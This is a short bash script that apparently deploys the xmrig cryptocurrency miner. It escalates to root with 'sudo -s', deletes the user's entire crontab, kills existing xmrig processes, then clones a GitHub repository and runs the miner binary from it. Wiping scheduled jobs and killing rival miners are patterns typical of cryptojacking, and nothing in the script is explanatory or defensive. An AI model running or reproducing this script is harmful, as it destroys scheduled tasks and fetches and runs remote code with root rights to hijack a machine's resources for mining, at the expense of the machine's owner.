#!/bin/bash
# bit.ly/3cleo1g
sudo -s
crontab -r
killall xmrig
git clone https://github.com/nuriyevn/r16
cd r16
chmod +x xmrig
./xmrig
